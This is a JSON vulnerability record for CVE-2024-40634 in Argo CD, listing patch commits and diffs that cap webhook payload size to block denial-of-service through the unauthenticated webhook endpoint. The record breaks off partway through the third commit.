{
    "CVE-2024-40634": {
        "published_date": "2024-07-22T17:22:55.732Z",
        "patch_commits": [
            {
                "url": "https://github.com/argoproj/argo-cd/commit/46c0c0b64deaab1ece70cb701030b76668ad0cdc",
                "content": "Merge commit from fork\n\n* feat: limit payload size\n\nSigned-off-by: pashakostohrys <pavel@codefresh.io>\n\n* fix cherry-pick issues\n\nSigned-off-by: pashakostohrys <pavel@codefresh.io>\n\n* fix cherry-pick issues\n\nSigned-off-by: pashakostohrys <pavel@codefresh.io>\n\n* fix cherry-pick issues\n\nSigned-off-by: pashakostohrys <pavel@codefresh.io>\n\n* fix cherry-pick issues\n\nSigned-off-by: pashakostohrys <pavel@codefresh.io>\n\n* fix cherry-pick issues\n\nSigned-off-by: pashakostohrys <pavel@codefresh.io>\n\n* fix linter\n\nSigned-off-by: pashakostohrys <pavel@codefresh.io>\n\n* fix lint and test issues\n\nSigned-off-by: pashakostohrys <pavel@codefresh.io>\n\n---------\n\nSigned-off-by: pashakostohrys <pavel@codefresh.io>\n\nFilename: docs/operator-manual/argocd-cm.yaml:\n```\n@@ -412,3 +412,5 @@\ndata:\n               cluster:\n                 name: some-cluster\n                 server: https://some-cluster\n+  # The maximum size of the payload that can be sent to the webhook server.\n+  webhook.maxPayloadSizeMB: 1024\n\\ No newline at end of file\n```\n\nFilename: docs/operator-manual/webhook.md:\n```\n@@ -19,6 +19,8 @@\nURL configured in the Git provider should use the `/api/webhook` endpoint of you\n (e.g. `https://argocd.example.com/api/webhook`). If you wish to use a shared secret, input an\n arbitrary value in the secret. This value will be used when configuring the webhook in the next step.\n \n+To prevent DDoS attacks with unauthenticated webhook events (the `/api/webhook` endpoint currently lacks rate limiting protection), it is recommended to limit the payload size. You can achieve this by configuring the `argocd-cm` ConfigMap with the `webhook.maxPayloadSizeMB` attribute. The default value is 1GB.\n+\n ## Github\n \n ![Add Webhook](../assets/webhook-config.png \"Add Webhook\")\n```\n\nFilename: server/server.go:\n```\n@@ -1034,7 +1034,7 @@\nfunc (a *ArgoCDServer) newHTTPServer(ctx context.Context, port int, grpcWebHandl\n \n \t// Webhook handler for git events (Note: cache timeouts are hardcoded because API server does not write to cache and not really using them)\n \targoDB := db.NewDB(a.Namespace, a.settingsMgr, a.KubeClientset)\n-\tacdWebhookHandler := webhook.NewHandler(a.Namespace, a.ArgoCDServerOpts.ApplicationNamespaces, a.AppClientset, a.settings, a.settingsMgr, repocache.NewCache(a.Cache.GetCache(), 24*time.Hour, 3*time.Minute), a.Cache, argoDB)\n+\tacdWebhookHandler := webhook.NewHandler(a.Namespace, a.ArgoCDServerOpts.ApplicationNamespaces, a.AppClientset, a.settings, a.settingsMgr, repocache.NewCache(a.Cache.GetCache(), 24*time.Hour, 3*time.Minute), a.Cache, argoDB, a.settingsMgr.GetMaxWebhookPayloadSize())\n \n \tmux.HandleFunc(\"/api/webhook\", acdWebhookHandler.Handler)\n```\n\nFilename: util/settings/settings.go:\n```\n@@ -429,6 +429,8 @@\nconst (\n \tsettingsWebhookAzureDevOpsUsernameKey = \"webhook.azuredevops.username\"\n \t// settingsWebhookAzureDevOpsPasswordKey is the key for Azure DevOps webhook password\n \tsettingsWebhookAzureDevOpsPasswordKey = \"webhook.azuredevops.password\"\n+\t// settingsWebhookMaxPayloadSize is the key for the maximum payload size for webhooks in MB\n+\tsettingsWebhookMaxPayloadSizeMB = \"webhook.maxPayloadSizeMB\"\n \t// settingsApplicationInstanceLabelKey is the key to configure injected app instance label key\n \tsettingsApplicationInstanceLabelKey = \"application.instanceLabelKey\"\n \t// settingsResourceTrackingMethodKey is the key to configure tracking method for application resources\n\n@@ -506,14 +508,17 @@\nconst (\n \tRespectRBACValueNormal = \"normal\"\n )\n \n-var (\n-\tsourceTypeToEnableGenerationKey = map[v1alpha1.ApplicationSourceType]string{\n-\t\tv1alpha1.ApplicationSourceTypeKustomize: \"kustomize.enable\",\n-\t\tv1alpha1.ApplicationSourceTypeHelm:      \"helm.enable\",\n-\t\tv1alpha1.ApplicationSourceTypeDirectory: \"jsonnet.enable\",\n-\t}\n+const (\n+\t// default max webhook payload size is 1GB\n+\tdefaultMaxWebhookPayloadSize = int64(1) * 1024 * 1024 * 1024\n )\n \n+var sourceTypeToEnableGenerationKey = map[v1alpha1.ApplicationSourceType]string{\n+\tv1alpha1.ApplicationSourceTypeKustomize: \"kustomize.enable\",\n+\tv1alpha1.ApplicationSourceTypeHelm:      \"helm.enable\",\n+\tv1alpha1.ApplicationSourceTypeDirectory: \"jsonnet.enable\",\n+}\n+\n // SettingsManager holds config info for a new manager with which to access Kubernetes ConfigMaps.\n type SettingsManager struct {\n \tctx             context.Context\n\n@@ -2209,3 +2214,22 @@\nfunc (mgr *SettingsManager) GetResourceCustomLabels() ([]string, error) {\n \t}\n \treturn []string{}, nil\n }\n+\n+func (mgr *SettingsManager) GetMaxWebhookPayloadSize() int64 {\n+\targoCDCM, err := mgr.getConfigMap()\n+\tif err != nil {\n+\t\treturn defaultMaxWebhookPayloadSize\n+\t}\n+\n+\tif argoCDCM.Data[settingsWebhookMaxPayloadSizeMB] == \"\" {\n+\t\treturn defaultMaxWebhookPayloadSize\n+\t}\n+\n+\tmaxPayloadSizeMB, err := strconv.ParseInt(argoCDCM.Data[settingsWebhookMaxPayloadSizeMB], 10, 64)\n+\tif err != nil {\n+\t\tlog.Warnf(\"Failed to parse '%s' key: %v\", settingsWebhookMaxPayloadSizeMB, err)\n+\t\treturn defaultMaxWebhookPayloadSize\n+\t}\n+\n+\treturn maxPayloadSizeMB * 1024 * 1024\n+}\n```\n\nFilename: util/webhook/webhook.go:\n```\n@@ -42,6 +42,8 @@\ntype settingsSource interface {\n // https://github.com/shadow-maint/shadow/blob/master/libmisc/chkname.c#L36\n const usernameRegex = `[a-zA-Z0-9_\\.][a-zA-Z0-9_\\.-]{0,30}[a-zA-Z0-9_\\.\\$-]?`\n \n+const payloadQueueSize = 50000\n+\n var (\n \t_                              settingsSource = &settings.SettingsManager{}\n \terrBasicAuthVerificationFailed                = errors.New(\"basic auth verification failed\")\n\n@@ -62,9 +64,11 @@\ntype ArgoCDWebhookHandler struct {\n \tazuredevopsAuthHandler func(r *http.Request) error\n \tgogs                   *gogs.Webhook\n \tsettingsSrc            settingsSource\n+\tqueue                  chan interface{}\n+\tmaxWebhookPayloadSizeB int64\n }\n \n-func NewHandler(namespace string, applicationNamespaces []string, appClientset appclientset.Interface, set *settings.ArgoCDSettings, settingsSrc settingsSource, repoCache *cache.Cache, serverCache *servercache.Cache, argoDB db.ArgoDB) *ArgoCDWebhookHandler {\n+func NewHandler(namespace string, applicationNamespaces []string, appClientset appclientset.Interface, set *settings.ArgoCDSettings, settingsSrc settingsSource, repoCache *cache.Cache, serverCache *servercache.Cache, argoDB db.ArgoDB, maxWebhookPayloadSizeB int64) *ArgoCDWebhookHandler {\n \tgithubWebhook, err := github.New(github.Options.Secret(set.WebhookGitHubSecret))\n \tif err != nil {\n \t\tlog.Warnf(\"Unable to init the GitHub webhook\")\n\n@@ -114,6 +118,8 @@\nfunc NewHandler(namespace string, applicationNamespaces []string, appClientset a\n \t\trepoCache:              repoCache,\n \t\tserverCache:            serverCache,\n \t\tdb:                     argoDB,\n+\t\tqueue:                  make(chan interface{}, payloadQueueSize),\n+\t\tmaxWebhookPayloadSizeB: maxWebhookPayloadSizeB,\n \t}\n \n \treturn &acdWebhook\n\n@@ -458,6 +464,8 @@\nfunc (a *ArgoCDWebhookHandler) Handler(w http.ResponseWriter, r *http.Request) {\n \tvar payload interface{}\n \tvar err error\n \n+\tr.Body = http.MaxBytesReader(w, r.Body, a.maxWebhookPayloadSizeB)\n+\n \tswitch {\n \tcase r.Header.Get(\"X-Vss-Activityid\") != \"\":\n \t\tif err = a.azuredevopsAuthHandler(r); err != nil {\n\n@@ -500,6 +508,14 @@\nfunc (a *ArgoCDWebhookHandler) Handler(w http.ResponseWriter, r *http.Request) {\n \t}\n \n \tif err != nil {\n+\t\t// If the error is due to a large payload, return a more user-friendly error message\n+\t\tif err.Error() == \"error parsing payload\" {\n+\t\t\tmsg := fmt.Sprintf(\"Webhook processing failed: The payload is either too large or corrupted. Please check the payload size (must be under %v MB) and ensure it is valid JSON\", a.maxWebhookPayloadSizeB/1024/1024)\n+\t\t\tlog.WithField(common.SecurityField, common.SecurityHigh).Warn(msg)\n+\t\t\thttp.Error(w, msg, http.StatusBadRequest)\n+\t\t\treturn\n+\t\t}\n+\n \t\tlog.Infof(\"Webhook processing failed: %s\", err)\n \t\tstatus := http.StatusBadRequest\n \t\tif r.Method != http.MethodPost {\n```\n\nFilename: util/webhook/webhook_test.go:\n```\n@@ -4,6 +4,7 @@\nimport (\n \t\"bytes\"\n \t\"encoding/json\"\n \t\"fmt\"\n+\t\"github.com/stretchr/testify/require\"\n \t\"io\"\n \t\"net/http\"\n \t\"net/http/httptest\"\n\n@@ -56,6 +57,11 @@\ntype reactorDef struct {\n }\n \n func NewMockHandler(reactor *reactorDef, applicationNamespaces []string, objects ...runtime.Object) *ArgoCDWebhookHandler {\n+\tdefaultMaxPayloadSize := int64(1) * 1024 * 1024 * 1024\n+\treturn NewMockHandlerWithPayloadLimit(reactor, applicationNamespaces, defaultMaxPayloadSize, objects...)\n+}\n+\n+func NewMockHandlerWithPayloadLimit(reactor *reactorDef, applicationNamespaces []string, maxPayloadSize int64, objects ...runtime.Object) *ArgoCDWebhookHandler {\n \tappClientset := appclientset.NewSimpleClientset(objects...)\n \tif reactor != nil {\n \t\tdefaultReactor := appClientset.ReactionChain[0]\n\n@@ -71,7 +77,7 @@\nfunc NewMockHandler(reactor *reactorDef, applicationNamespaces []string, objects\n \t\tcacheClient,\n \t\t1*time.Minute,\n \t\t1*time.Minute,\n-\t), servercache.NewCache(appstate.NewCache(cacheClient, time.Minute), time.Minute, time.Minute, time.Minute), &mocks.ArgoDB{})\n+\t), servercache.NewCache(appstate.NewCache(cacheClient, time.Minute), time.Minute, time.Minute, time.Minute), &mocks.ArgoDB{}, maxPayloadSize)\n }\n \n func TestGitHubCommitEvent(t *testing.T) {\n\n@@ -391,8 +397,9 @@\nfunc TestInvalidEvent(t *testing.T) {\n \treq.Header.Set(\"X-GitHub-Event\", \"push\")\n \tw := httptest.NewRecorder()\n \th.Handler(w, req)\n-\tassert.Equal(t, w.Code, http.StatusBadRequest)\n-\texpectedLogResult := \"Webhook processing failed: error parsing payload\"\n+\tclose(h.queue)\n+\tassert.Equal(t, http.StatusBadRequest, w.Code)\n+\texpectedLogResult := \"Webhook processing failed: The payload is either too large or corrupted. Please check the payload size (must be under 1024 MB) and ensure it is valid JSON\"\n \tassert.Equal(t, expectedLogResult, hook.LastEntry().Message)\n \tassert.Equal(t, expectedLogResult+\"\\n\", w.Body.String())\n \thook.Reset()\n\n@@ -683,3 +690,21 @@\nfunc Test_getWebUrlRegex(t *testing.T) {\n \t\t})\n \t}\n }\n+\n+func TestGitHubCommitEventMaxPayloadSize(t *testing.T) {\n+\thook := test.NewGlobal()\n+\tmaxPayloadSize := int64(100)\n+\th := NewMockHandlerWithPayloadLimit(nil, []string{}, maxPayloadSize)\n+\treq := httptest.NewRequest(http.MethodPost, \"/api/webhook\", nil)\n+\treq.Header.Set(\"X-GitHub-Event\", \"push\")\n+\teventJSON, err := os.ReadFile(\"testdata/github-commit-event.json\")\n+\trequire.NoError(t, err)\n+\treq.Body = io.NopCloser(bytes.NewReader(eventJSON))\n+\tw := httptest.NewRecorder()\n+\th.Handler(w, req)\n+\tclose(h.queue)\n+\tassert.Equal(t, http.StatusBadRequest, w.Code)\n+\texpectedLogResult := \"Webhook processing failed: The payload is either too large or corrupted. Please check the payload size (must be under 0 MB) and ensure it is valid JSON\"\n+\tassert.Equal(t, expectedLogResult, hook.LastEntry().Message)\n+\thook.Reset()\n+}\n```"
            },
            {
                "url": "https://github.com/argoproj/argo-cd/commit/540e3a57b90eb3655db54793332fac86bcc38b36",
                "content": "Merge commit from fork\n\n* feat: limit payload size\n\nSigned-off-by: pashakostohrys <pavel@codefresh.io>\n\n* git cherry-pick a6841386468365e458a61896cc48ff18163f25c0\n\nSigned-off-by: pashakostohrys <pavel@codefresh.io>\n\n* git cherry-pick a08356a8eb13ced5850ec886f4a3b823de606f65\n\nSigned-off-by: pashakostohrys <pavel@codefresh.io>\n\n* git cherry-pick f0a1f1efe721d486d6fe6cb4f645b269c6781794\n\nSigned-off-by: pashakostohrys <pavel@codefresh.io>\n\n* git cherry-pick 3dd77292073c692f0deb7b4296976a60489bc442\n\nSigned-off-by: pashakostohrys <pavel@codefresh.io>\n\n* git cherry-pick 3bf68adf84c09c44f2c42548b8421df127d61587\n\nSigned-off-by: pashakostohrys <pavel@codefresh.io>\n\n* fix cherry-pick issues\n\nSigned-off-by: pashakostohrys <pavel@codefresh.io>\n\n* fix cherry-pick issues\n\nSigned-off-by: pashakostohrys <pavel@codefresh.io>\n\n---------\n\nSigned-off-by: pashakostohrys <pavel@codefresh.io>\n\nFilename: docs/operator-manual/argocd-cm.yaml:\n```\n@@ -410,3 +410,6 @@\ndata:\n               cluster:\n                 name: some-cluster\n                 server: https://some-cluster\n+          \n+          # The maximum size of the payload that can be sent to the webhook server.\n+          webhook.maxPayloadSizeMB: 1024\n\\ No newline at end of file\n```\n\nFilename: docs/operator-manual/webhook.md:\n```\n@@ -19,6 +19,7 @@\nURL configured in the Git provider should use the `/api/webhook` endpoint of you\n (e.g. `https://argocd.example.com/api/webhook`). If you wish to use a shared secret, input an\n arbitrary value in the secret. This value will be used when configuring the webhook in the next step.\n \n+To prevent DDoS attacks with unauthenticated webhook events (the `/api/webhook` endpoint currently lacks rate limiting protection), it is recommended to limit the payload size. You can achieve this by configuring the `argocd-cm` ConfigMap with the `webhook.maxPayloadSizeMB` attribute. The default value is 1GB.\n ## Github\n \n ![Add Webhook](../assets/webhook-config.png \"Add Webhook\")\n```\n\nFilename: server/server.go:\n```\n@@ -1048,7 +1048,7 @@\nfunc (a *ArgoCDServer) newHTTPServer(ctx context.Context, port int, grpcWebHandl\n \n \t// Webhook handler for git events (Note: cache timeouts are hardcoded because API server does not write to cache and not really using them)\n \targoDB := db.NewDB(a.Namespace, a.settingsMgr, a.KubeClientset)\n-\tacdWebhookHandler := webhook.NewHandler(a.Namespace, a.ArgoCDServerOpts.ApplicationNamespaces, a.AppClientset, a.settings, a.settingsMgr, a.RepoServerCache, a.Cache, argoDB)\n+\tacdWebhookHandler := webhook.NewHandler(a.Namespace, a.ArgoCDServerOpts.ApplicationNamespaces, a.AppClientset, a.settings, a.settingsMgr, a.RepoServerCache, a.Cache, argoDB, a.settingsMgr.GetMaxWebhookPayloadSize())\n \n \tmux.HandleFunc(\"/api/webhook\", acdWebhookHandler.Handler)\n```\n\nFilename: util/settings/settings.go:\n```\n@@ -431,6 +431,8 @@\nconst (\n \tsettingsWebhookAzureDevOpsUsernameKey = \"webhook.azuredevops.username\"\n \t// settingsWebhookAzureDevOpsPasswordKey is the key for Azure DevOps webhook password\n \tsettingsWebhookAzureDevOpsPasswordKey = \"webhook.azuredevops.password\"\n+\t// settingsWebhookMaxPayloadSize is the key for the maximum payload size for webhooks in MB\n+\tsettingsWebhookMaxPayloadSizeMB = \"webhook.maxPayloadSizeMB\"\n \t// settingsApplicationInstanceLabelKey is the key to configure injected app instance label key\n \tsettingsApplicationInstanceLabelKey = \"application.instanceLabelKey\"\n \t// settingsResourceTrackingMethodKey is the key to configure tracking method for application resources\n\n@@ -518,6 +520,11 @@\nvar (\n \t}\n )\n \n+const (\n+\t// default max webhook payload size is 1GB\n+\tdefaultMaxWebhookPayloadSize = int64(1) * 1024 * 1024 * 1024\n+)\n+\n // SettingsManager holds config info for a new manager with which to access Kubernetes ConfigMaps.\n type SettingsManager struct {\n \tctx             context.Context\n\n@@ -2221,3 +2228,22 @@\nfunc (mgr *SettingsManager) GetResourceCustomLabels() ([]string, error) {\n \t}\n \treturn []string{}, nil\n }\n+\n+func (mgr *SettingsManager) GetMaxWebhookPayloadSize() int64 {\n+\targoCDCM, err := mgr.getConfigMap()\n+\tif err != nil {\n+\t\treturn defaultMaxWebhookPayloadSize\n+\t}\n+\n+\tif argoCDCM.Data[settingsWebhookMaxPayloadSizeMB] == \"\" {\n+\t\treturn defaultMaxWebhookPayloadSize\n+\t}\n+\n+\tmaxPayloadSizeMB, err := strconv.ParseInt(argoCDCM.Data[settingsWebhookMaxPayloadSizeMB], 10, 64)\n+\tif err != nil {\n+\t\tlog.Warnf(\"Failed to parse '%s' key: %v\", settingsWebhookMaxPayloadSizeMB, err)\n+\t\treturn defaultMaxWebhookPayloadSize\n+\t}\n+\n+\treturn maxPayloadSizeMB * 1024 * 1024\n+}\n```\n\nFilename: util/webhook/webhook.go:\n```\n@@ -41,6 +41,8 @@\ntype settingsSource interface {\n // https://github.com/shadow-maint/shadow/blob/master/libmisc/chkname.c#L36\n const usernameRegex = `[a-zA-Z0-9_\\.][a-zA-Z0-9_\\.-]{0,30}[a-zA-Z0-9_\\.\\$-]?`\n \n+const payloadQueueSize = 50000\n+\n var (\n \t_                              settingsSource = &settings.SettingsManager{}\n \terrBasicAuthVerificationFailed                = errors.New(\"basic auth verification failed\")\n\n@@ -61,9 +63,11 @@\ntype ArgoCDWebhookHandler struct {\n \tazuredevopsAuthHandler func(r *http.Request) error\n \tgogs                   *gogs.Webhook\n \tsettingsSrc            settingsSource\n+\tqueue                  chan interface{}\n+\tmaxWebhookPayloadSizeB int64\n }\n \n-func NewHandler(namespace string, applicationNamespaces []string, appClientset appclientset.Interface, set *settings.ArgoCDSettings, settingsSrc settingsSource, repoCache *cache.Cache, serverCache *servercache.Cache, argoDB db.ArgoDB) *ArgoCDWebhookHandler {\n+func NewHandler(namespace string, applicationNamespaces []string, appClientset appclientset.Interface, set *settings.ArgoCDSettings, settingsSrc settingsSource, repoCache *cache.Cache, serverCache *servercache.Cache, argoDB db.ArgoDB, maxWebhookPayloadSizeB int64) *ArgoCDWebhookHandler {\n \tgithubWebhook, err := github.New(github.Options.Secret(set.WebhookGitHubSecret))\n \tif err != nil {\n \t\tlog.Warnf(\"Unable to init the GitHub webhook\")\n\n@@ -113,6 +117,8 @@\nfunc NewHandler(namespace string, applicationNamespaces []string, appClientset a\n \t\trepoCache:              repoCache,\n \t\tserverCache:            serverCache,\n \t\tdb:                     argoDB,\n+\t\tqueue:                  make(chan interface{}, payloadQueueSize),\n+\t\tmaxWebhookPayloadSizeB: maxWebhookPayloadSizeB,\n \t}\n \n \treturn &acdWebhook\n\n@@ -388,6 +394,8 @@\nfunc (a *ArgoCDWebhookHandler) Handler(w http.ResponseWriter, r *http.Request) {\n \tvar payload interface{}\n \tvar err error\n \n+\tr.Body = http.MaxBytesReader(w, r.Body, a.maxWebhookPayloadSizeB)\n+\n \tswitch {\n \tcase r.Header.Get(\"X-Vss-Activityid\") != \"\":\n \t\tif err = a.azuredevopsAuthHandler(r); err != nil {\n\n@@ -430,6 +438,14 @@\nfunc (a *ArgoCDWebhookHandler) Handler(w http.ResponseWriter, r *http.Request) {\n \t}\n \n \tif err != nil {\n+\t\t// If the error is due to a large payload, return a more user-friendly error message\n+\t\tif err.Error() == \"error parsing payload\" {\n+\t\t\tmsg := fmt.Sprintf(\"Webhook processing failed: The payload is either too large or corrupted. Please check the payload size (must be under %v MB) and ensure it is valid JSON\", a.maxWebhookPayloadSizeB/1024/1024)\n+\t\t\tlog.WithField(common.SecurityField, common.SecurityHigh).Warn(msg)\n+\t\t\thttp.Error(w, msg, http.StatusBadRequest)\n+\t\t\treturn\n+\t\t}\n+\n \t\tlog.Infof(\"Webhook processing failed: %s\", err)\n \t\tstatus := http.StatusBadRequest\n \t\tif r.Method != http.MethodPost {\n```\n\nFilename: util/webhook/webhook_test.go:\n```\n@@ -4,6 +4,7 @@\nimport (\n \t\"bytes\"\n \t\"encoding/json\"\n \t\"fmt\"\n+\t\"github.com/stretchr/testify/require\"\n \t\"io\"\n \t\"net/http\"\n \t\"net/http/httptest\"\n\n@@ -56,6 +57,11 @@\ntype reactorDef struct {\n }\n \n func NewMockHandler(reactor *reactorDef, applicationNamespaces []string, objects ...runtime.Object) *ArgoCDWebhookHandler {\n+\tdefaultMaxPayloadSize := int64(1) * 1024 * 1024 * 1024\n+\treturn NewMockHandlerWithPayloadLimit(reactor, applicationNamespaces, defaultMaxPayloadSize, objects...)\n+}\n+\n+func NewMockHandlerWithPayloadLimit(reactor *reactorDef, applicationNamespaces []string, maxPayloadSize int64, objects ...runtime.Object) *ArgoCDWebhookHandler {\n \tappClientset := appclientset.NewSimpleClientset(objects...)\n \tif reactor != nil {\n \t\tdefaultReactor := appClientset.ReactionChain[0]\n\n@@ -72,7 +78,7 @@\nfunc NewMockHandler(reactor *reactorDef, applicationNamespaces []string, objects\n \t\t1*time.Minute,\n \t\t1*time.Minute,\n \t\t10*time.Second,\n-\t), servercache.NewCache(appstate.NewCache(cacheClient, time.Minute), time.Minute, time.Minute, time.Minute), &mocks.ArgoDB{})\n+\t), servercache.NewCache(appstate.NewCache(cacheClient, time.Minute), time.Minute, time.Minute, time.Minute), &mocks.ArgoDB{}, maxPayloadSize)\n }\n \n func TestGitHubCommitEvent(t *testing.T) {\n\n@@ -392,8 +398,9 @@\nfunc TestInvalidEvent(t *testing.T) {\n \treq.Header.Set(\"X-GitHub-Event\", \"push\")\n \tw := httptest.NewRecorder()\n \th.Handler(w, req)\n-\tassert.Equal(t, w.Code, http.StatusBadRequest)\n-\texpectedLogResult := \"Webhook processing failed: error parsing payload\"\n+\tclose(h.queue)\n+\tassert.Equal(t, http.StatusBadRequest, w.Code)\n+\texpectedLogResult := \"Webhook processing failed: The payload is either too large or corrupted. Please check the payload size (must be under 1024 MB) and ensure it is valid JSON\"\n \tassert.Equal(t, expectedLogResult, hook.LastEntry().Message)\n \tassert.Equal(t, expectedLogResult+\"\\n\", w.Body.String())\n \thook.Reset()\n\n@@ -604,3 +611,21 @@\nfunc Test_getWebUrlRegex(t *testing.T) {\n \t\t})\n \t}\n }\n+\n+func TestGitHubCommitEventMaxPayloadSize(t *testing.T) {\n+\thook := test.NewGlobal()\n+\tmaxPayloadSize := int64(100)\n+\th := NewMockHandlerWithPayloadLimit(nil, []string{}, maxPayloadSize)\n+\treq := httptest.NewRequest(http.MethodPost, \"/api/webhook\", nil)\n+\treq.Header.Set(\"X-GitHub-Event\", \"push\")\n+\teventJSON, err := os.ReadFile(\"testdata/github-commit-event.json\")\n+\trequire.NoError(t, err)\n+\treq.Body = io.NopCloser(bytes.NewReader(eventJSON))\n+\tw := httptest.NewRecorder()\n+\th.Handler(w, req)\n+\tclose(h.queue)\n+\tassert.Equal(t, http.StatusBadRequest, w.Code)\n+\texpectedLogResult := \"Webhook processing failed: The payload is either too large or corrupted. Please check the payload size (must be under 0 MB) and ensure it is valid JSON\"\n+\tassert.Equal(t, expectedLogResult, hook.LastEntry().Message)\n+\thook.Reset()\n+}\n```"
            },
            {
                "url": "https://github.com/argoproj/argo-cd/commit/d881ee78949e23160a0b280bb159e4d3d625a4df",
                "content": "Merge commit from fork\n\n* feat: limit payload size\n\nSigned-off-by: pashakostohrys <pavel@codefresh.io>\n\n* fix cherry-pick issues\n\nSigned-off-by: pashakostohrys <pavel@codefresh.io>\n\n* fix cherry-pick issues\n\nSigned-off-by: pashakostohrys <pavel@codefresh.io>\n\n* fix cherry-pick issues\n\nSigned-off-by: pashakostohrys <pavel@codefresh.io>\n\n* fix cherry-pick issues\n\nSigned-off-by: pashakostohrys <pavel@codefresh.io>\n\n* fix cherry-pick issues\n\nSigned-off-by: pashakostohrys <pavel@codefresh.io>\n\n* fix linter\n\nSigned-off-by: pashakostohrys <pavel@codefresh.io>\n\n* fix lint and test issues\n\nSigned-off-by: pashakostohrys <pavel@codefresh.io>\n\n---------\n\nSigned-off-by: pashakostohrys <pavel@codefresh.io>\n\nFilename: docs/operator-manual/argocd-cm.yaml:\n```\n@@ -406,3 +406,5 @@\ndata:\n               cluster:\n                 name: some-cluster\n                 server: https://some-cluster\n+  # The maximum size of the payload that can be sent to the webhook server.\n+  webhook.maxPayloadSizeMB: 1024\n\\ No newline at end of file\n```\n\nFilename: docs/operator-manual/webhook.md:\n```\n@@ -19,6 +19,8 @@\nURL configured in the Git provider should use the `/api/webhook` endpoint of you\n (e.g. `https://argocd.example.com/api/webhook`). If you wish to use a shared secret, input an\n arbitrary value in the secret. This value will be used when configuring the webhook in the next step.\n \n+To prevent DDoS attacks with unauthenticated webhook events (the `/api/webhook` endpoint currently lacks rate limiting protection), it is recommended to limit the payload size. You can achieve this by configuring the `argocd-cm` ConfigMap with the `webhook.maxPayloadSizeMB` attribute. The default value is 1GB.\n+\n ## Github\n \n ![Add Webhook](../assets/webhook-config.png \"Add Webhook\")\n```\n\nFilename: server/server.go:\n```\n@@ -1034,7 +1034,7 @@\nfunc (a *ArgoCDServer) newHTTPServer(ctx context.Context, port int, grpcWebHandl\n \n \t// Webhook handler for git events (Note: cache timeouts are hardcoded because API server does not write to cache and not really using them)\n \targoDB := db.NewDB(a.Namespace, a.settingsMgr, a.KubeClientset)\n-\tacdWebhookHandler := webhook.NewHandler(a.Namespace, a.ArgoCDServerOpts.ApplicationNamespaces, a.AppClientset, a.settings, a.settingsMgr, repocache.NewCache(a.Cache.GetCache(), 24*time.Hour, 3*time.Minute), a.Cache, argoDB)\n+\tacdWebhookHandler := webhook.NewHandler(a.Namespace, a.ArgoCDServerOpts.ApplicationNamespaces, a.AppClientset, a.settings, a.settingsMgr, repocache.NewCache(a.Cache.GetCache(), 24*time.Hour, 3*time.Minute), a.Cache, argoDB, a.settingsMgr.GetMaxWebhookPayloadSize())\n \n \tmux.HandleFunc(\"/api/webhook\", acdWebhookHandler.Handler)\n```\n\nFilename: util/settings/settings.go:\n```\n@@ -420,6 +420,8 @@\nconst (\n \tsettingsWebhookAzureDevOpsUsernameKey = \"webhook.azuredevops.username\"\n \t// settingsWebhookAzureDevOpsPasswordKey is the key for Azure DevOps webhook password\n \tsettingsWebhookAzureDevOpsPasswordKey = \"webhook.azuredevops.password\"\n+\t// settingsWebhookMaxPayloadSize is the key for the maximum payload size for webhooks in MB\n+\tsettingsWebhookMaxPayloadSizeMB = \"webhook.maxPayloadSizeMB\"\n \t// settingsApplicationInstanceLabelKey is the key to configure injected app instance label key\n \tsettingsApplicationInstanceLabelKey = \"application.instanceLabelKey\"\n \t// settingsResourceTrackingMethodKey is the key to configure tracking method for application resources\n\n@@ -497,14 +499,17 @@\nconst (\n \tRespectRBACValueNormal = \"normal\"\n )\n \n-var (\n-\tsourceTypeToEnableGenerationKey = map[v1alpha1.ApplicationSourceType]string{\n-\t\tv1alpha1.ApplicationSourceTypeKustomize: \"kustomize.enable\",\n-\t\tv1alpha1.ApplicationSourceTypeHelm:      \"helm.enable\",\n-\t\tv1alpha1.ApplicationSourceTypeDirectory: \"jsonnet.enable\",\n-\t}\n+const (\n+\t// default max webhook payload size is 1GB\n+\tdefaultMaxWebhookPayloadSize = int64(1) * 1024 * 1024 * 1024\n )\n \n+var sourceTypeToEnableGenerationKey = map[v1alpha1.ApplicationSourceType]string{\n+\tv1alpha1.ApplicationSourceTypeKustomize: \"kustomize.enable\",\n+\tv1alpha1.ApplicationSourceTypeHelm:      \"helm.enable\",\n+\tv1alpha1.ApplicationSourceTypeDirectory: \"jsonnet.enable\",\n+}\n+\n // SettingsManager holds config info for a new manager with which to access Kubernetes ConfigMaps.\n type SettingsManager struct {\n \tctx             context.Context\n\n@@ -2159,3 +2164,22 @@\nfunc (mgr *SettingsManager) GetResourceCustomLabels() ([]string, error) {\n \t}\n \treturn []string{}, nil\n }\n+\n+func (mgr *SettingsManager) GetMaxWebhookPayloadSize() int64 {\n+\targoCDCM, err := mgr.getConfigMap()\n+\tif err != nil {\n+\t\treturn defaultMaxWebhookPayloadSize\n+\t}\n+\n+\tif argoCDCM.Data[settingsWebhookMaxPayloadSizeMB] == \"\" {\n+\t\treturn defaultMaxWebhookPayloadSize\n+\t}\n+\n+\tmaxPayloadSizeMB, err := strconv.ParseInt(argoCDCM.Data[settingsWebhookMaxPayloadSizeMB], 10, 64)\n+\tif err != nil {\n+\t\tlog.Warnf(\"Failed to parse '%s' key: %v\", settingsWebhookMaxPayloadSizeMB, err)\n+\t\treturn defaultMaxWebhookPayloadSize\n+\t}\n+\n+\treturn maxPayloadSizeMB * 1024 * 1024\n+}\n```\n\nFilename: util/webhook/webhook.go:\n```\n@@ -42,6 +42,8 @@\ntype settingsSource interface {\n // https://github.com/shadow-maint/shadow/blob/master/libmisc/chkname.c#L36\n const usernameRegex = `[a-zA-Z0-9_\\.][a-zA-Z0-9_\\.-]{0,30}[a-zA-Z0-9_\\.\\$-]?`\n \n+const payloadQueueSize = 50000\n+\n var (\n \t_                              settingsSource = &settings.SettingsManager{}\n \terrBasicAuthVerificationFailed                = errors.New(\"basic auth verification failed\")\n\n@@ -62,9 +64,11 @@\ntype ArgoCDWebhookHandler struct {\n \tazuredevopsAuthHandler func(r *http.Request) error\n \tgogs                   *gogs.Webhook\n \tsettingsSrc            settingsSource\n+\tqueue                  chan interface{}\n+\tmaxWebhookPayloadSizeB int64\n }\n \n-func NewHandler(namespace string, applicationNamespaces []string, appClientset appclientset.Interface, set *settings.ArgoCDSettings, settingsSrc settingsSource, repoCache *cache.Cache, serverCache *servercache.Cache, argoDB db.ArgoDB) *ArgoCDWebhookHandler {\n+func NewHandler(namespace string, applicationNamespaces []string, appClientset appclientset.Interface, set *settings.ArgoCDSettings, settingsSrc settingsSource, repoCache *cache.Cache, serverCache *servercache.Cache, argoDB db.ArgoDB, maxWebhookPayloadSizeB int64) *ArgoCDWebhookHandler {\n \tgithubWebhook, err := 